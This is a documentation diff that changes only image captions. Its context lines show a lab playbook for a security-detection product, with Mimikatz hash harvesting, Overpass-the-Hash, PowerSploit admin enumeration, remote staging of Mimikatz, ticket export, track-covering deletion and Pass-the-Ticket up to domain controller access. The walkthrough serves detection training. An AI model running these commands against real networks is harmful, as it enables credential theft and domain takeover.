@@ -45,7 +45,7 @@ During our mock reconnaissance attacks, **VictimPC** wasn't only exposed to Jeff
     ```
 
 1. Open **c:\\temp\\victimpc.txt** to view the harvested credentials Mimikatz found and wrote to the txt file.
-    ![Mimikatz output including RonHD's NTLM hash](media/playbook-lateral-sekurlsa-logonpasswords-output.png)
+    ![Mimikatz output including RonHD's NTLM hash.](media/playbook-lateral-sekurlsa-logonpasswords-output.png)
 
 1. We successfully harvested RonHD's NTLM hash from memory using mimikatz. We'll need the NTLM hash shortly.
 
@@ -64,7 +64,7 @@ From **VictimPC**, run the following command:
 net user ronhd /domain
 ```
 
-![Reconnaissance against RonHD's account](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)
+![Reconnaissance against RonHD's account.](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)
 
 From the results, we learn RonHD is a member of the "Helpdesk" Security Group. We know RonHD gives us privileges that come with the account *and* with the Helpdesk Security Group.
 
@@ -81,7 +81,7 @@ Using a common technique called **Overpass-the-Hash**, the harvested NTLM hash i
     > [!Note]
     > If your hash for RonHD was different in the previous steps, replace the NTLM hash above with the hash you gathered from *victimpc.txt*.
 
-    ![Overpass-the-hash via mimikatz](media/playbook-lateral-opth1.png)
+    ![Overpass-the-hash via mimikatz.](media/playbook-lateral-opth1.png)
 
 1. Check that a new command prompt opens. It will be executing as RonHD, but that may not seem obvious *yet*. Don't close the new command prompt since you'll use it next.
 
@@ -100,13 +100,13 @@ We'll use **PowerSploit** ```Get-NetLocalGroup``` to help answer that.
     Get-NetLocalGroup 10.0.24.6
     ```
 
-    ![Get local admins for 10.0.24.6 via PowerSploit](media/playbook-lateral-adminpcsamr.png)
+    ![Get local admins for 10.0.24.6 via PowerSploit.](media/playbook-lateral-adminpcsamr.png)
 
     Behind the scenes, this uses Remote SAM to identify the local admins for the IP we discovered earlier that was exposed to a Domain Admin account.
 
     Our output will look similar to:
 
-    ![Output of the PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)
+    ![Output of the PowerSploit Get-NetLocalGroup.](media/playbook-lateral-adminpcsamr_results.png)
 
     This machine has two Local Administrators, the built-in Administrator "ContosoAdmin" and "Helpdesk". We know RonHD is a member of the "Helpdesk" Security Group. We also were told the machine's name, AdminPC. Since we have RonHD's credentials, we should be able to use it to laterally move to AdminPC and gain access to that machine.
 
@@ -122,7 +122,7 @@ We'll use **PowerSploit** ```Get-NetLocalGroup``` to help answer that.
     klist
     ```
 
-    ![Use klist to show us Kerberos tickets in our current cmd.exe process](media/playbook-lateral-klist.png)
+    ![Use klist to show us Kerberos tickets in our current cmd.exe process.](media/playbook-lateral-klist.png)
 
 You can see that, for this particular process, we have RonHD's TGT in memory. We successfully performed an Overpass-the-Hash attack in our lab. We converted the NTLM hash that was compromised earlier and used it to obtain a Kerberos TGT. That Kerberos TGT was then used to gain access to another network resource, in this case, AdminPC.
 
@@ -130,11 +130,11 @@ You can see that, for this particular process, we have RonHD's TGT in memory. We
 
 Looking at the [!INCLUDE [Product short](includes/product-short.md)] console, we can see the following things:
 
-![[!INCLUDE [Product short](includes/product-short.md)] detecting the Overpass-the-Hash attack](media/playbook-lateral-opthdetection.png)
+![[!INCLUDE [Product short.](includes/product-short.md)] detecting the Overpass-the-Hash attack](media/playbook-lateral-opthdetection.png)
 
 [!INCLUDE [Product short](includes/product-short.md)] detected that RonHD's account was compromised on VictimPC and then used to successfully get a Kerberos TGT. If we click on RonHD's name in the alert, we're taken to the Logical Activity timeline of RonHD, where we can further our investigation.
 
-![View the detection in the Logical Activity timeline](media/playbook-lateral-opthlogicalactivity.png)
+![View the detection in the Logical Activity timeline.](media/playbook-lateral-opthlogicalactivity.png)
 
 In the Security Operations Center, our Security Analyst is made aware of the compromised credential and can quickly investigate what resources it accessed.
 
@@ -158,7 +158,7 @@ xcopy mimikatz.exe \\adminpc\c$\temp
 
 Press `d` when prompted, stating that the "temp" folder is a directory on AdminPC.
 
-![Copy files to AdminPC](media/playbook-escalation-xcopy1.png)
+![Copy files to AdminPC.](media/playbook-escalation-xcopy1.png)
 
 ### Mimikatz sekurlsa::tickets
 
@@ -178,7 +178,7 @@ With Mimikatz staged on AdminPC, we'll use PsExec to remotely execute it.
     xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
     ```
 
-    ![Export harvested credentials from AdminPC back to VictimPC](media/playbook-escalation-export_tickets2.png)
+    ![Export harvested credentials from AdminPC back to VictimPC.](media/playbook-escalation-export_tickets2.png)
 
 1. Let's clean up our tracks on AdminPC by deleting our files.
 
@@ -191,7 +191,7 @@ With Mimikatz staged on AdminPC, we'll use PsExec to remotely execute it.
 
     On our **VictimPC**, we have these harvested tickets in our **c:\temp\adminpc_tickets** folder:
 
-    ![C:\temp\tickets is our exported mimikatz output from AdminPC](media/playbook-escalation-export_tickets4.png)
+    ![C:\temp\tickets is our exported mimikatz output from AdminPC.](media/playbook-escalation-export_tickets4.png)
 
 ### Mimikatz Kerberos::ptt
 
@@ -203,7 +203,7 @@ With the tickets locally on VictimPC, it's finally time to become SamiraA by "Pa
     mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
     ```
 
-    ![Import the stolen tickets into the cmd.exe process](media/playbook-escalation-ptt1.png)
+    ![Import the stolen tickets into the cmd.exe process.](media/playbook-escalation-ptt1.png)
 
 1. In the same elevated command prompt, validate that the right tickets are in the command prompt session. Execute the following command:
 
@@ -211,7 +211,7 @@ With the tickets locally on VictimPC, it's finally time to become SamiraA by "Pa
     klist
     ```
 
-    ![Run klist to see the imported tickets in the CMD process](media/playbook-escalation-ptt2.png)
+    ![Run klist to see the imported tickets in the CMD process.](media/playbook-escalation-ptt2.png)
 
 1. Note that these tickets remain unused. Acting as an attacker, we successfully "passed the ticket". We harvested SamirA's credential from AdminPC, and then passed it to another process running on VictimPC.
 
@@ -224,7 +224,7 @@ With the tickets locally on VictimPC, it's finally time to become SamiraA by "Pa
     dir \\ContosoDC\c$
     ```
 
-    ![Access the C drive of ContosoDC using SamirA's credentials](media/playbook-escalation-ptt3.png)
+    ![Access the C drive of ContosoDC using SamirA's credentials.](media/playbook-escalation-ptt3.png)
 
 Success! Through our mock attacks, we gained administrator access on our domain controller and succeeded in compromising our lab's Active Directory Domain/Forest.
 
@@ -238,7 +238,7 @@ Most security tools have no way to detect when a legitimate credential was used 
 
 [!INCLUDE [Product short](includes/product-short.md)] detections and alert information are of critical value to any Digital Forensics Incident Response (DFIR) team. You can not only see the credentials being stolen, but also learn what resources the stolen ticket was used to access and compromise.
 
-![[!INCLUDE [Product short](includes/product-short.md)] detects Pass-the-Ticket with two-hour suppression](media/playbook-escalation-pttdetection.png)
+![[!INCLUDE [Product short.](includes/product-short.md)] detects Pass-the-Ticket with two-hour suppression](media/playbook-escalation-pttdetection.png)
 
 > [!NOTE]
 > This event will only display on the [!INCLUDE [Product short](includes/product-short.md)] console in **2 hours**. Events of this type are purposefully suppressed for this timeframe to reduce false positives.
